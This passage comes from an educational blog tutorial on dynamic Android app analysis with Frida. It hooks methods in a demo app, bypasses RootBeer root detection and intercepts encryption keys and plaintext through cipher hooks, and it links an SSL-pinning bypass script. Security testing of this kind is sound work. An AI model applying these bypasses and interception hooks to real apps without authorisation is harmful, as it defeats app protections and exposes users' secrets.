punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>this</code> will be the original MainActivity, and <code>this.onCreate.call</code> can call the original implementation, with the first parameter of the call method being <code>this</code>, followed by the parameters.</p><p>After executing the above script, another error will appear:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Error: onCreate<span class="token punctuation">(</span><span class="token punctuation">)</span>: argument types <span class="token keyword">do</span> not match any of:  .overload<span class="token punctuation">(</span><span class="token string">'android.os.Bundle'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>This is because onCreate should actually have parameters, but we did not receive any parameters when we overrode it, so an error occurred. To avoid this problem, I would recommend adding <code>.overload()</code> at the beginning when overriding the implementation, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Frida will then show an error message again to tell you what the correct parameters should be, so you can follow it. Finally, it will look like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'android.os.Bundle'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In this way, you can know what the parameters are, and you can also pass in parameters when calling the original implementation, so there will be no errors.</p><p>Since we can insert code, we can do a lot of things, such as displaying a new message directly on the UI:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'android.os.Bundle'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>      <span class="token comment">// Toast should be run on the main thread(UI thread)</span>      Java<span class="token punctuation">.</span><span class="token function">scheduleOnMainThread</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> Toast <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"android.widget.Toast"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> currentApplication <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'android.app.ActivityThread'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// We need context for displaying the Toast</span>        <span class="token keyword">var</span> context <span class="token operator">=</span> currentApplication<span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Toast<span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>          context<span class="token punctuation">,</span>          <span class="token comment">// The type should be correct</span>          Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$<span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">"Hello!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          Toast<span class="token punctuation">.</span><span class="token constant">LENGTH_SHORT</span><span class="token punctuation">.</span>value        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Code from: <a href="https://gist.github.com/myzhan/ab13068463cd7f77b7f06ae561ea853a">makeToast.js</a>.</p><h2><span id="bypassing-root-detection-with-frida">Bypassing Root Detection with Frida</span></h2><p>In our previous article, we bypassed root detection by directly modifying the smali code and patching the function that performs the detection. With Frida, we don’t need to modify the smali code anymore. We can directly hook the function that performs the detection and replace its implementation, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> RootBeer <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.scottyab.rootbeer.RootBeer'</span><span class="token punctuation">)</span>        RootBeer<span class="token punctuation">.</span>isRooted<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bypass rootbeer'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Yes, it’s that easy.</p><p>You may ask, how do we know to hook this function? This part still requires static analysis. From static analysis, we know that this function is doing a check, so we use Frida to hook this function.</p><p>For myself, I usually use two methods in combination. First, I disassemble and statically analyze the code, take a quick look at the code, and then use Frida to hook it to see if I can achieve what I want. If I can, I will go to the corresponding place in smali and then repack the app. This way, I can execute the process I want even on a phone without Frida.</p><p>In fact, the basic use of Frida is like this. The rest depends on understanding of the code and Android development to determine which function to hook.</p><h2><span id="other-frida-tips">Other Frida Tips</span></h2><p>Below are some Frida tips that I found on the internet and have used in practice for your reference.</p><h3><span id="print-stack-trace">Print stack trace</span></h3><p>Suppose an app has a check mechanism that detects whether it has root, and the source code is obfuscated, making it difficult to trace. However, when checking, it will output check-related information using Log.d. At this time, we can hook Log.d and use <code>Log.getStackTraceString</code> to output the stack trace to know where this function is called:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Log <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"android.util.Log"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> Exception <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"java.lang.Exception"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Log<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// print stack trace</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Log<span class="token punctuation">.</span><span class="token function">getStackTraceString</span><span class="token punctuation">(</span> Exception<span class="token punctuation">.</span>$<span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="hook-reflect-related-methods">Hook Reflect-related methods</span></h3><p>In Java, in addition to calling methods directly, you can also call them through reflection (Reflect). Some obfuscated programs use this technique extensively to enhance the difficulty of static analysis. We can print out every dynamically called method to see if there are any clues:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// hook Class.forName</span><span class="token keyword">var</span> JavaClass <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'java.lang.Class'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>JavaClass<span class="token punctuation">.</span>forName<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'boolean'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.ClassLoader'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Class.forName'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>  <span class="token comment">// we can log all methods in certain class</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'cymetrics'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> TargetClass <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> methodsList <span class="token operator">=</span> TargetClass<span class="token punctuation">.</span>class<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span>methodsList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>methodsList<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>forName<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'boolean'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.ClassLoader'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// hook Method.invoke</span><span class="token keyword">var</span> Method <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'java.lang.reflect.Method'</span><span class="token punctuation">)</span>Method<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'java.lang.Object'</span><span class="token punctuation">,</span> <span class="token string">'[Ljava.lang.Object;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'reflect'</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="hook-string-operations">Hook string operations</span></h3><p>Some obfuscated programs will scramble all the fixed strings in the program through various steps to make them difficult to search, such as turning strings into numbers and then restoring them. Usually, when restoring, string operations will be performed. At this time, we can directly hook the string operations and use the stack trace mentioned earlier to trace:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token string">'java.lang.StringBuilder'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.StringBuffer'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">clazz<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'toString'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> ret <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ret:'</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="hook-encryption-and-decryption-related-operations">Hook encryption and decryption-related operations</span></h3><p>Usually, in an Android app, if you want to perform encryption and decryption, you will use the built-in API, like this (source: <a href="https://cloud.tencent.com/developer/article/1647740">AES encryption in Android–Part 1</a>):</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">CODE_TYPE</span> <span class="token operator">=</span> <span class="token string">"UTF-8"</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">AES_TYPE</span> <span class="token operator">=</span> <span class="token string">"AES/ECB/PKCS5Padding"</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">AES_KEY</span><span class="token operator">=</span><span class="token string">"1111222233334444"</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token class-name">String</span> cleartext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SecretKeySpec</span> key <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span><span class="token constant">AES_KEY</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token constant">AES_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token constant">ENCRYPT_MODE</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encryptedData <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>cleartext<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token constant">CODE_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>encryptedData<span class="token punctuation">,</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token constant">DEFAULT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, as long as you can hook methods like <code>SecretKeySpec</code> or <code>doFinal</code>, you can intercept the key and plaintext before encryption.</p><p>This article is worth reading: <a href="https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication/">How Secure is your Android Keystore Authentication?</a>, which includes a bunch of Frida scripts related to encryption and decryption. Here: <a href="https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js">https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js</a></p><p>By the way, the script does not directly convert byte arrays to strings. Here is a more convenient way (source: <a href="https://lingwu111.github.io/frida%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bstring%E4%B8%8Ebyte%E8%BD%AC%E5%8C%96.html">frida小技巧之string与byte转化</a>):</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">bytesToString</span><span class="token punctuation">(</span><span class="token parameter">bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> javaString <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> javaString<span class="token punctuation">.</span>$<span class="token keyword">new</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> Base64 <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'android.util.Base64'</span><span class="token punctuation">)</span>Base64<span class="token punctuation">.</span>decode<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'[B'</span><span class="token punctuation">,</span> <span class="token string">'int'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bytesToString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2><span id="ssl-pinning">SSL Pinning</span></h2><p>I saw a great script in <a href="https://httptoolkit.tech/blog/frida-certificate-pinning/">Defeating Android Certificate Pinning with Frida</a> that automatically hooks various functions that do SSL pinning, allowing you to bypass this mechanism. I saved a copy here: <a href="https://gist.github.com/aszx87410/f7ae60826d436d8e5bd17deb3e40c249">https://gist.github.com/aszx87410/f7ae60826d436d8e5bd17deb3e40c249</a></p><p>After saving, run it like this:</p><pre class="line-numbers language-none"><code class="language-none">frida -U --no-pause -l ssl.js -f &quot;com.example&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2><span id="detecting-frida">Detecting Frida</span></h2><p>Since Frida is so powerful, some app security mechanisms naturally want to block it. Once Frida is detected, the app will either exit directly or cause a crash. You can refer to the following two articles:</p><ol><li><a href="https://www.jianshu.com/p/f679cb404524">Android Reverse Engineering: Multiple Feature Detection of Frida</a></li><li><a href="https://blog.csdn.net/zhangmiaoping23/article/details/109697329">Multiple Feature Detection of Frida</a></li></ol><p>There are many ways to anti-detection, one of which is to hook the various methods mentioned in the above articles. After all, we have root privileges and Frida hook in front, so as long as we know how it is judged, we can definitely remove the check. If you can’t find the check, you can use various hooks mentioned above to find it out step by step.</p><h2><span id="conclusion">Conclusion</span></h2><p>In this article, we introduced the basic usage of Frida and learned how to use Frida to hook various methods to obtain various information we want.</p><p>In the first four articles, we covered some basic things, including:</p><ol><li>Basic Android App composition</li><li>How to use Apktool to unpack and repack apk</li><li>How to use jadx to restore smali to java files</li><li>Familiar with a little bit of smali syntax, know how to modify code and add code</li><li>How to intercept packets through a proxy on a computer</li><li>How to modify the apk to allow the proxy to intercept smoothly</li><li>How to use Frida to hook function</li><li>Various tricks of Frida</li></ol><p>If you go further, you will enter the field of native.</p><p>In addition to using Java to write Android Apps, you can also use <a href="https://developer.android.com/ndk">Android NDK</a> to write code in C&#x2F;C++, which can be provided to Android apps.</p><p>When do you need it? The first is the more performance-consuming places, such as image recognition, using C++ to write will be faster than Java, so native is usually used. The second is some more secretive operations, such as encryption and decryption. If placed in the Java layer, it is easy to decompile and see what is being done. If written in native, more binary-related knowledge is required to crack it.</p><p>In addition, the apps in the real world are not as simple as the apps we demonstrated earlier. They may be encapsulated or more strongly obfuscated. Even if the apk can be unpacked, if the shell cannot be removed, the real logic cannot be seen. Some shells also have mechanisms for anti-tampering and anti-dynamic analysis, which can block attackers with insufficient skills. Relevant introductions can refer to the agenda of <a href="http://confapi.ithome.com.tw/session/4186">2019 Taiwan Cyber Security Week</a>: <a href="https://s.itho.me/cybersec/2019/slides/321/I_%E4%B8%96%E8%B2%BF%E4%B8%89/0321I51610%E7%8E%8B%E7%BE%BF%E5%BB%B7.pdf">Building a Secure and Convenient App Security Protection Product</a></p><p>The reason why this series is called “Introduction” is because it completely does not mention the practical things that will be encountered, and only focuses on the basics and tools of the introduction. However, for apps without special obfuscation or encapsulation, this should be enough.</p><p>References:</p><ol><li><a href="https://github.com/hookmaster/frida-all-in-one">Frida Handbook</a></li><li><a href="https://www.giantbranch.cn/2019/10/25/%E7%BF%BB%E8%AF%91%E2%80%94%E2%80%94N%E7%A7%8D%E8%84%B1%E5%A3%B3%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/">Translation-N Ways to Unpack Android Malware</a></li><li><a href="https://kevinspider.github.io/fridahookjava/">frida hook java</a></li><li><a href="https://juejin.cn/post/6847902219757420552#heading-39">This is probably the most detailed notes for learning Frida</a></li><li><a 